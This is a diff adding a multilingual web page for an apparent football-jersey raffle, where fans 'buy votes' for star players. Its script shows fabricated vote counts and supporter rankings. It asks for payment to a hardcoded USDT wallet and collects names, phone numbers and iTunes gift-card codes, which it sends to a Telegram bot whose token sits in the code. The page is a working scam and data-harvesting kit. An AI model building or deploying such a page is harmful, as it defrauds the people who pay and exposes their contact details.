@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html lang="pt-BR" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sorteio dos Fãs Fanáticos</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
+
+        body {
+            font-family: 'Poppins', 'Segoe UI', Tahoma, sans-serif;
+            background: radial-gradient(circle at top, #1e293b 0%, #020617 100%);
+            background-attachment: fixed;
+            color: #f8fafc;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            transition: all 0.3s ease;
+        }
+        
+        .lang-switch {
+            width: 100%;
+            max-width: 800px;
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 20px;
+        }
+
+        .lang-select {
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(10px);
+            color: #fbbf24;
+            border: 1px solid rgba(251, 191, 36, 0.3);
+            padding: 10px 20px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .lang-select:hover {
+            background: rgba(51, 65, 85, 0.9);
+            border-color: #fbbf24;
+            transform: translateY(-2px);
+        }
+
+        .header-section {
+            text-align: center;
+            margin-bottom: 40px;
+            background: rgba(30, 41, 59, 0.4);
+            backdrop-filter: blur(12px);
+            padding: 30px 20px;
+            border-radius: 20px;
+            border: 1px solid rgba(251, 191, 36, 0.4);
+            box-shadow: 0 10px 30px rgba(251, 191, 36, 0.15);
+            max-width: 800px;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header-section::before {
+            content: '';
+            position: absolute;
+            top: -50%; left: -50%; width: 200%; height: 200%;
+            background: radial-gradient(circle, rgba(251,191,36,0.1) 0%, transparent 60%);
+            z-index: -1;
+        }
+        
+        h1 {
+            color: #fbbf24;
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            margin-top: 0;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-shadow: 0 0 20px rgba(251, 191, 36, 0.4);
+        }
+        
+        .prize-info {
+            color: #10b981;
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px rgba(16, 185, 129, 0.3);
+        }
+
+        .leaderboard {
+            background: rgba(30, 41, 59, 0.6);
+            backdrop-filter: blur(10px);
+            width: 100%;
+            max-width: 800px;
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 40px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+        }
+
+        .leaderboard h2 {
+            text-align: center;
+            color: #f8fafc;
+            margin-top: 0;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.1);
+            padding-bottom: 15px;
+            font-weight: 800;
+            letter-spacing: 1px;
+        }
+
+        .top-supporters {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 25px;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .supporter {
+            text-align: center;
+            background: rgba(15, 23, 42, 0.6);
+            padding: 20px;
+            border-radius: 15px;
+            min-width: 130px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: transform 0.3s ease;
+        }
+
+        .supporter:hover {
+            transform: translateY(-5px);
+        }
+
+        .supporter.first {
+            transform: scale(1.15);
+            border-color: #fbbf24;
+            box-shadow: 0 0 25px rgba(251, 191, 36, 0.3);
+            background: linear-gradient(180deg, rgba(30,41,59,0.8) 0%, rgba(15,23,42,0.9) 100%);
+        }
+
+        .supporter.first:hover { transform: scale(1.15) translateY(-5px); }
+        .supporter.first .medal { color: #fbbf24; filter: drop-shadow(0 0 10px rgba(251, 191, 36, 0.8)); } 
+        .supporter.second .medal { color: #94a3b8; } 
+        .supporter.third .medal { color: #d97706; } 
+
+        .medal {
+            font-size: 3rem;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .supporter-name {
+            font-weight: 600;
+            font-size: 1.2rem;
+            color: #fff;
+            margin-bottom: 5px;
+        }
+
+        .supporter-votes {
+            color: #34d399;
+            font-size: 1rem;
+            font-weight: 600;
+            background: rgba(16, 185, 129, 0.1);
+            padding: 4px 10px;
+            border-radius: 20px;
+            display: inline-block;
+        }
+
+        .voting-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+            width: 100%;
+            max-width: 1100px;
+        }
+
+        .player-card {
+            background: rgba(30, 41, 59, 0.5);
+            backdrop-filter: blur(10px);
+            padding: 30px 20px;
+            border-radius: 24px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            overflow: hidden;
+        }
+
+        .player-card:hover {
+            transform: translateY(-12px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 0 0 20px rgba(251, 191, 36, 0.1);
+            border-color: rgba(251, 191, 36, 0.4);
+        }
+
+        @keyframes pulse-glow {
+            0% { box-shadow: 0 0 0 0 rgba(251, 191, 36, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(251, 191, 36, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(251, 191, 36, 0); }
+        }
+
+        .rank-badge {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+            color: #fff;
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: 800;
+            font-size: 1.3rem;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+            border: 2px solid #fff;
+            z-index: 2;
+        }
+
+        .player-card:nth-child(1) .rank-badge {
+            animation: pulse-glow 2s infinite;
+        }
+
+        .player-img {
+            width: 140px;
+            height: 140px;
+            border-radius: 50%;
+            object-fit: cover;
+            object-position: top;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            margin-bottom: 20px;
+            background-color: #0f172a;
+            transition: all 0.4s ease;
+        }
+
+        .player-card:hover .player-img {
+            border-color: #fbbf24;
+            transform: scale(1.05);
+        }
+
+        .player-name {
+            font-size: 1.8rem;
+            font-weight: 800;
+            margin: 10px 0;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+        }
+
+        .payment-section {
+            background: rgba(15, 23, 42, 0.7);
+            padding: 20px;
+            border-radius: 16px;
+            margin-top: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .price-tag {
+            color: #fbbf24;
+            font-weight: 600;
+            font-size: 1.1rem;
+            margin-bottom: 12px;
+            display: block;
+        }
+
+        .vote-input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            background: rgba(255, 255, 255, 0.05);
+            color: white;
+            text-align: center;
+            font-size: 1rem;
+            font-weight: 600;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        
+        .vote-input:focus {
+            border-color: #fbbf24;
+        }
+
+        .vote-input option {
+            background: #1e293b;
+            color: #fff;
+        }
+
+        .pay-btn {
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            color: #fff;
+            border: none;
+            padding: 14px 20px;
+            font-size: 1.1rem;
+            font-weight: 800;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .pay-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.5);
+            background: linear-gradient(135deg, #34d399 0%, #10b981 100%);
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(2, 6, 23, 0.85);
+            backdrop-filter: blur(8px);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal-content {
+            background: linear-gradient(180deg, #1e293b 0%, #0f172a 100%);
+            padding: 35px;
+            border-radius: 24px;
+            text-align: center;
+            max-width: 450px;
+            width: 90%;
+            border: 2px solid #fbbf24;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.8), 0 0 30px rgba(251,191,36,0.2);
+            position: relative;
+        }
+
+        .crypto-box {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.4);
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .crypto-box span {
+            color: #34d399;
+            font-size: 0.95rem;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .wallet-address {
+            background: rgba(0, 0, 0, 0.3);
+            color: #fbbf24;
+            padding: 12px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 1rem;
+            word-break: break-all;
+            border: 1px solid rgba(251, 191, 36, 0.3);
+            user-select: all;
+        }
+
+        .modal-content input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            background: rgba(0, 0, 0, 0.2);
+            color: white;
+            text-align: start;
+            box-sizing: border-box;
+            font-size: 1rem;
+            transition: all 0.3s;
+            outline: none;
+        }
+
+        .modal-content input:focus {
+            border-color: #fbbf24;
+            background: rgba(0, 0, 0, 0.4);
+            box-shadow: 0 0 10px rgba(251, 191, 36, 0.2);
+        }
+
+        .confirm-btn {
+            background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%);
+            color: #0f172a;
+            border: none;
+            padding: 14px 20px;
+            font-weight: 800;
+            font-size: 1.1rem;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 15px;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3);
+            text-transform: uppercase;
+        }
+
+        .confirm-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(245, 158, 11, 0.5);
+            background: linear-gradient(135deg, #fcd34d 0%, #fbbf24 100%);
+        }
+        
+        .close-btn {
+            background: transparent;
+            color: #94a3b8;
+            border: 1px solid #475569;
+            padding: 12px 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 15px;
+            width: 100%;
+            font-weight: 600;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .close-btn:hover {
+            background: rgba(239, 68, 68, 0.1);
+            color: #ef4444;
+            border-color: #ef4444;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="lang-switch">
+        <select class="lang-select" id="langToggleBtn" onchange="changeLanguage(this.value)">
+            <option value="pt-BR">Português (Brasil)</option>
+            <option value="es-AR">Español (Argentina)</option>
+            <option value="fr">Français</option>
+            <option value="en">English</option>
+            <option value="ar">العربية</option>
+            <option value="ku">کوردی</option>
+        </select>
+    </div>
+
+    <div class="header-section">
+        <h1 id="txt-title">🏆 Sorteio dos Fãs Fanáticos</h1>
+        <div class="prize-info" id="txt-subtitle">Participe e ganhe a camisa autografada do seu jogador!</div>
+        <p id="txt-desc">Cada $1 equivale a 10 votos para o seu jogador e 1 bilhete para o sorteio.</p>
+    </div>
+
+    <div class="leaderboard">
+        <h2 id="txt-leaderboard">👑 Placar de Fãs</h2>
+        <div class="top-supporters" id="leaderboard-container"></div>
+    </div>
+
+    <div class="voting-container" id="voting-container"></div>
+
+    <div class="modal" id="payment-modal">
+        <div class="modal-content">
+            <h2 id="txt-modal-title" style="color: #fbbf24; margin-top: 0; font-weight: 800;">Confirmar Participação</h2>
+            <p id="modal-info" style="color: #cbd5e1; margin-bottom: 20px; font-size: 0.95rem; line-height: 1.5;"></p>
+            
+            <div class="crypto-box">
+                <span id="txt-crypto">Para pagar com USDT (Rede TRC20):</span>
+                <div class="wallet-address">TCtMbDSXpZxMVzPp24Y29b4kuUWziyhEe4</div>
+            </div>
+            
+            <input type="text" id="supporter-name" placeholder="Seu Nome (para o placar)..." required>
+            <input type="text" id="supporter-phone" placeholder="Seu Número de Telefone..." required>
+            <input type="text" id="payment-code" placeholder="Código iTunes ou TxID Cripto..." required>
+            
+            <button id="send-btn" class="confirm-btn" onclick="submitPayment()">Enviar Detalhes</button>
+            <button id="close-btn" class="close-btn" onclick="closeModal()">Cancelar</button>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8577645928:AAFkm77nSi7v8VB87VlMbLbUmhB3XjUk2nk"; 
+        const TELEGRAM_CHAT_ID = "6966391786"; 
+
+        let currentLang = 'pt-BR';
+
+        const translations = {
+            'pt-BR': {
+                title: "🏆 Sorteio dos Fãs Fanáticos",
+                subtitle: "Participe e ganhe a camisa autografada do seu jogador!",
+                desc: "Cada $1 equivale a 10 votos para o seu jogador e 1 bilhete para o sorteio.",
+                leaderboard: "👑 Placar de Fãs",
+                totalVotes: "Votos Totais:",
+                priceTag: "Cada $1 = 10 votos",
+                btnParticipate: "Participar",
+                modalTitle: "Confirmar Participação",
+                modalInfo: "Para dar {votes} votos para {player}, por favor, use um dos métodos de pagamento abaixo.",
+                cryptoInfo: "Para pagar com USDT (Rede TRC20):",
+                inputName: "Seu Nome (para o placar)...",
+                inputPhone: "Seu Número de Telefone (para contato)...",
+                inputCode: "Código iTunes ou TxID Cripto...",
+                btnSend: "Enviar Detalhes",
+                btnCancel: "Cancelar",
+                sending: "Enviando...",
+                votesText: "Votos",
+                ticketText: "Bilhete",
+                alertFill: "Por favor, preencha todas as informações corretamente!",
+                alertSuccess: "Muito obrigado {name}! Seus detalhes foram enviados. Assim que verificados, seus votos serão adicionados.",
+                alertError: "Ocorreu um erro ao enviar, por favor, tente novamente."
+            },
+            'es-AR': {
+                title: "🏆 Sorteo de Hinchas Fanáticos",
+                subtitle: "¡Participá y ganá la camiseta firmada de tu jugador!",
+                desc: "Cada $1 equivale a 10 votos para tu jugador y 1 entrada para el sorteo.",
+                leaderboard: "👑 Ranking de Hinchas",
+                totalVotes: "Votos Totales:",
+                priceTag: "Cada $1 = 10 votos",
+                btnParticipate: "Participar",
+                modalTitle: "Confirmar Participación",
+                modalInfo: "Para dar {votes} votos a {player}, por favor usá uno de los métodos de pago.",
+                cryptoInfo: "Para pagar con USDT (Red TRC20):",
+                inputName: "Tu Nombre (para el ranking)...",
+                inputPhone: "Tu Número de Teléfono (para contacto)...",
+                inputCode: "Código de iTunes o TxID Cripto...",
+                btnSend: "Enviar Detalles",
+                btnCancel: "Cancelar",
+                sending: "Enviando...",
+                votesText: "Votos",
+                ticketText: "Entrada",
+                alertFill: "¡Por favor, completá toda la información correctamente!",
+                alertSuccess: "¡Muchas gracias {name}! Tus datos fueron enviados. Una vez verificados, se sumarán tus votos.",
+                alertError: "Hubo un error al enviar, por favor intentá de nuevo."
+            },
+            'fr': {
+                title: "🏆 Tirage au Sort des Fans",
+                subtitle: "Participez et gagnez le maillot dédicacé de votre joueur !",
+                desc: "Chaque 1 $ équivaut à 10 votes pour votre joueur et 1 ticket pour le tirage.",
+                leaderboard: "👑 Classement des Fans",
+                totalVotes: "Votes Totaux :",
+                priceTag: "Chaque 1 $ = 10 votes",
+                btnParticipate: "Participer",
+                modalTitle: "Confirmer la Participation",
+                modalInfo: "Pour attribuer {votes} votes à {player}, veuillez utiliser l'une des méthodes de paiement.",
+                cryptoInfo: "Pour payer avec USDT (Réseau TRC20) :",
+                inputName: "Votre Nom (pour le classement)...",
+                inputPhone: "Votre Numéro de Téléphone (pour contact)...",
+                inputCode: "Code iTunes ou TxID Crypto...",
+                btnSend: "Envoyer les Détails",
+                btnCancel: "Annuler",
+                sending: "Envoi en cours...",
+                votesText: "Votes",
+                ticketText: "Ticket",
+                alertFill: "Veuillez remplir toutes les informations correctement !",
+                alertSuccess: "Merci beaucoup {name} ! Vos détails ont été envoyés. Une fois vérifiés, vos votes seront ajoutés.",
+                alertError: "Une erreur s'est produite lors de l'envoi, veuillez réessayer."
+            },
+            en: {
+                title: "🏆 Die-Hard Fans Draw",
+                subtitle: "Participate and win your player's signed jersey!",
+                desc: "Every $1 equals 10 votes for your player and 1 draw ticket.",
+                leaderboard: "👑 Fan Leaderboard",
+                totalVotes: "Total Votes:",
+                priceTag: "Every $1 = 10 votes",
+                btnParticipate: "Participate",
+                modalTitle: "Confirm Participation",
+                modalInfo: "To cast {votes} votes for {player}, please use one of the payment methods.",
+                cryptoInfo: "To pay with USDT (TRC20 Network):",
+                inputName: "Your Name (for leaderboard)...",
+                inputPhone: "Your Phone Number (to contact if you win)...",
+                inputCode: "iTunes code or Crypto TxID...",
+                btnSend: "Send Details",
+                btnCancel: "Cancel",
+                sending: "Sending...",
+                votesText: "Votes",
+                ticketText: "Ticket",
+                alertFill: "Please fill out all information correctly!",
+                alertSuccess: "Thank you {name}! Your details have been sent. Once verified, your votes will be added.",
+                alertError: "An error occurred while sending, please try again."
+            },
+            ar: {
+                title: "🏆 سحب المشجعين المتعصبين",
+                subtitle: "شارك واربح قميص لاعبك المفضل موقعاً منه!",
+                desc: "كل 1$ يساوي 10 أصوات للاعبك و تذكرة واحدة للسحب.",
+                leaderboard: "👑 لوحة صدارة المشجعين",
+                totalVotes: "إجمالي الأصوات:",
+                priceTag: "كل 1$ = 10 أصوات",
+                btnParticipate: "شارك الآن",
+                modalTitle: "تأكيد المشاركة",
+                modalInfo: "لمنح {votes} صوتاً لـ {player}، يرجى استخدام إحدى طرق الدفع.",
+                cryptoInfo: "للدفع عبر USDT (شبكة TRC20):",
+                inputName: "اسمك (للوحة الصدارة)...",
+                inputPhone: "رقم هاتفك (للتواصل)...",
+                inputCode: "كود آيتونز أو TxID للعملات الرقمية...",
+                btnSend: "إرسال التفاصيل",
+                btnCancel: "إلغاء",
+                sending: "جاري الإرسال...",
+                votesText: "أصوات",
+                ticketText: "تذكرة",
+                alertFill: "يرجى ملء جميع المعلومات بشكل صحيح!",
+                alertSuccess: "شكراً جزيلاً {name}! تم إرسال تفاصيلك. بمجرد التحقق، ستتم إضافة أصواتك.",
+                alertError: "حدث خطأ أثناء الإرسال، يرجى المحاولة مرة أخرى."
+            },
+            ku: {
+                title: "🏆 تیروپشکی هاندەرە سەرسەختەکان",
+                subtitle: "بەشداربە و درێسی یاریزانەکەت بە واژووی خۆیەوە ببەرەوە!",
+                desc: "هەر $1 بەرامبەرە بە 10 دەنگ بۆ یاریزانەکەت و 1 بلیت بۆ تیروپشکەکە.",
+                leaderboard: "👑 پێشەنگی هاندەران",
+                totalVotes: "کۆی دەنگەکان:",
+                priceTag: "هەر $1 = 10 دەنگ",
+                btnParticipate: "بەشداریکردن",
+                modalTitle: "پەسەندکردنی بەشداریکردن",
+                modalInfo: "بۆ پێدانی {votes} دەنگ بە {player}، تکایە یەکێک لە ڕێگاکانی پارەدان بەکاربهێنە.",
+                cryptoInfo: "بۆ پارەدان بە USDT (تۆڕی TRC20):",
+                inputName: "ناوی خۆت (بۆ تابلۆی پێشەنگەکان)...",
+                inputPhone: "ژمارە مۆبایلەکەت (بۆ پەیوەندیکردن)...",
+                inputCode: "کۆدی ئایتونس یان TxID ی کریپتۆ...",
+                btnSend: "ناردنی زانیارییەکان",
+                btnCancel: "پاشگەزبوونەوە",
+                sending: "خەریکی ناردنە...",
+                votesText: "دەنگ",
+                ticketText: "بلیت",
+                alertFill: "تکایە هەموو زانیارییەکان بە دروستی پڕبکەرەوە!",
+                alertSuccess: "زۆر سوپاس {name}! زانیارییەکانت نێردرا. هەرکە بینرا، دەنگەکانت بۆ ماڵپەڕەکە زیاد دەکرێن.",
+                alertError: "کێشەیەک ڕوویدا لە ناردنی کۆدەکە، تکایە دووبارە هەوڵ بدەرەوە."
+            }
+        };
+
+        let players = [
+            { id: 0, names: { ku: "ڕۆناڵدۆ", en: "Ronaldo", ar: "رونالدو", 'pt-BR': "Ronaldo", 'es-AR': "Ronaldo", fr: "Ronaldo" }, img: "https://upload.wikimedia.org/wikipedia/commons/8/8c/Cristiano_Ronaldo_2018.jpg", totalVotes: 27900 },
+            { id: 1, names: { ku: "میسی", en: "Messi", ar: "ميسي", 'pt-BR': "Messi", 'es-AR': "Messi", fr: "Messi" }, img: "https://upload.wikimedia.org/wikipedia/commons/b/b4/Lionel-Messi-Argentina-2022-FIFA-World-Cup_%28cropped%29.jpg", totalVotes: 28450 },
+            { id: 2, names: { ku: "نەیمار", en: "Neymar", ar: "نيمار", 'pt-BR': "Neymar", 'es-AR': "Neymar", fr: "Neymar" }, img: "https://upload.wikimedia.org/wikipedia/commons/8/83/Bra-Cos_%281%29_%28cropped%29.jpg", totalVotes: 14800 },
+            { id: 3, names: { ku: "مباپێ", en: "Mbappé", ar: "مبابي", 'pt-BR': "Mbappé", 'es-AR': "Mbappé", fr: "Mbappé" }, img: "https://upload.wikimedia.org/wikipedia/commons/b/b3/2022_FIFA_World_Cup_France_4%E2%80%931_Australia_-_%287%29_%28cropped%29.jpg", totalVotes: 15200 }
+        ];
+
+        let topSupporters = [
+            { names: { ku: "تیاگۆ", en: "Thiago", ar: "تياغو", 'pt-BR': "Thiago", 'es-AR': "Thiago", fr: "Thiago" }, votesBought: 1250 },
+            { names: { ku: "ئینزۆ", en: "Enzo", ar: "إنزو", 'pt-BR': "Enzo", 'es-AR': "Enzo", fr: "Enzo" }, votesBought: 980 },
+            { names: { ku: "ئەنتوان", en: "Antoine", ar: "أنطوان", 'pt-BR': "Antoine", 'es-AR': "Antoine", fr: "Antoine" }, votesBought: 750 }
+        ];
+
+        let selectedPlayerId = null;
+        let selectedAmount = 0;
+
+        function changeLanguage(lang) {
+            currentLang = lang;
+            
+            document.documentElement.lang = currentLang;
+            document.documentElement.dir = (currentLang === 'ku' || currentLang === 'ar') ? 'rtl' : 'ltr';
+            
+            updateStaticText();
+            renderUI();
+        }
+
+        function updateStaticText() {
+            const t = translations[currentLang];
+            document.getElementById('txt-title').innerText = t.title;
+            document.getElementById('txt-subtitle').innerText = t.subtitle;
+            document.getElementById('txt-desc').innerText = t.desc;
+            document.getElementById('txt-leaderboard').innerText = t.leaderboard;
+            document.getElementById('txt-modal-title').innerText = t.modalTitle;
+            document.getElementById('txt-crypto').innerText = t.cryptoInfo;
+            
+            document.getElementById('supporter-name').placeholder = t.inputName;
+            document.getElementById('supporter-phone').placeholder = t.inputPhone;
+            document.getElementById('payment-code').placeholder = t.inputCode;
+            
+            document.getElementById('send-btn').innerText = t.btnSend;
+            document.getElementById('close-btn').innerText = t.btnCancel;
+        }
+
+        function renderUI() {
+            let container = document.getElementById('voting-container');
+            container.innerHTML = ''; 
+            const t = translations[currentLang];
+
+            let displayPlayers = [...players].sort((a, b) => b.totalVotes - a.totalVotes);
+
+            displayPlayers.forEach((player, index) => {
+                let playerName = player.names[currentLang];
+                let ticketWord = t.ticketText;
+                let votesWord = t.votesText;
+
+                let cardHTML = `
+                <div class="player-card">
+                    <div class="rank-badge">#${index + 1}</div>
+                    <img src="${player.img}" alt="${playerName}" class="player-img">
+                    <div class="player-name">${playerName}</div>
+                    <div style="color: #cbd5e1; margin-bottom: 15px; font-weight: 600; font-size: 1.1rem;">
+                        ${t.totalVotes} <span style="color:#fbbf24;">${player.totalVotes.toLocaleString()}</span>
+                    </div>
+                    
+                    <div class="payment-section">
+                        <span class="price-tag">${t.priceTag}</span>
+                        <select id="amount-${player.id}" class="vote-input">
+                            <option value="1">$1 (10 ${votesWord} + 1 ${ticketWord})</option>
+                            <option value="5">$5 (50 ${votesWord} + 5 ${ticketWord}s)</option>
+                            <option value="10">$10 (100 ${votesWord} + 15 ${ticketWord}s)</option>
+                            <option value="50">$50 (500 ${votesWord} + 100 ${ticketWord}s)</option>
+                        </select>
+                        <button class="pay-btn" onclick="openModal(${player.id})">${t.btnParticipate}</button>
+                    </div>
+                </div>
+                `;
+                container.innerHTML += cardHTML;
+            });
+
+            renderLeaderboard();
+        }
+
+        function renderLeaderboard() {
+            topSupporters.sort((a, b) => b.votesBought - a.votesBought);
+            let board = document.getElementById('leaderboard-container');
+            board.innerHTML = '';
+            const t = translations[currentLang];
+            
+            let medals = ['🥇', '🥈', '🥉'];
+            let classes = ['first', 'second', 'third'];
+
+            for (let i = 0; i < Math.min(3, topSupporters.length); i++) {
+                let sup = topSupporters[i];
+                let supName = sup.names[currentLang];
+                board.innerHTML += `
+                    <div class="supporter ${classes[i]}">
+                        <div class="medal">${medals[i]}</div>
+                        <div class="supporter-name">${supName}</div>
+                        <div class="supporter-votes">${sup.votesBought} ${t.votesText}</div>
+                    </div>
+                `;
+            }
+        }
+
+        function openModal(playerId) {
+            selectedPlayerId = playerId;
+            let amountSelect = document.getElementById(`amount-${playerId}`);
+            selectedAmount = parseInt(amountSelect.value);
+            
+            let votes = selectedAmount * 10;
+            if(selectedAmount == 10) votes = 100;
+            if(selectedAmount == 50) votes = 500;
+
+            const t = translations[currentLang];
+            
+            let playerObj = players.find(p => p.id === playerId);
+            let playerName = playerObj.names[currentLang];
+            
+            let infoText = t.modalInfo.replace('{votes}', `<strong style="color:#fbbf24">${votes}</strong>`).replace('{player}', `<strong style="color:#10b981">${playerName}</strong>`);
+            document.getElementById('modal-info').innerHTML = infoText;
+            document.getElementById('payment-modal').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('payment-modal').style.display = 'none';
+        }
+
+        async function submitPayment() {
+            let name = document.getElementById('supporter-name').value;
+            let phone = document.getElementById('supporter-phone').value;
+            let code = document.getElementById('payment-code').value;
+            let btn = document.getElementById('send-btn');
+            const t = translations[currentLang];
+
+            if(!name || !phone || !code) {
+                alert(t.alertFill);
+                return;
+            }
+
+            btn.innerText = t.sending;
+            btn.disabled = true;
+
+            let votes = selectedAmount * 10;
+            if(selectedAmount == 10) votes = 100;
+            if(selectedAmount == 50) votes = 500;
+
+            let playerObj = players.find(p => p.id === selectedPlayerId);
+
+            let message = `
+🎉 **بەشداربوویەکی نوێ هەیە!**
+👤 **ناو:** ${name}
+📱 **ژمارە مۆبایل:** ${phone}
+💳 **کۆد / TxID:** ${code}
+💵 **بڕی پارە:** $${selectedAmount}
+🗳️ **یاریزان:** ${playerObj.names['ku']}
+🔢 **ژمارەی دەنگ:** ${votes}
+🌐 **زمان:** ${currentLang}
+            `;
+
+            let url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            try {
+                let response = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: "Markdown"
+                    })
+                });
+
+                if (response.ok) {
+                    let successMsg = t.alertSuccess.replace('{name}', name);
+                    alert(successMsg);
+                    
+                    document.getElementById('supporter-name').value = '';
+                    document.getElementById('supporter-phone').value = '';
+                    document.getElementById('payment-code').value = '';
+                    closeModal();
+                } else {
+                    alert(t.alertError);
+                }
+            } catch (error) {
+                alert(t.alertError);
+            }
+
+            btn.innerText = t.btnSend;
+            btn.disabled = false;
+        }
+
+        window.onload = () => {
+            document.getElementById('langToggleBtn').value = currentLang;
+            updateStaticText();
+            renderUI();
+        };
+    </script>
+</body>
+</html>
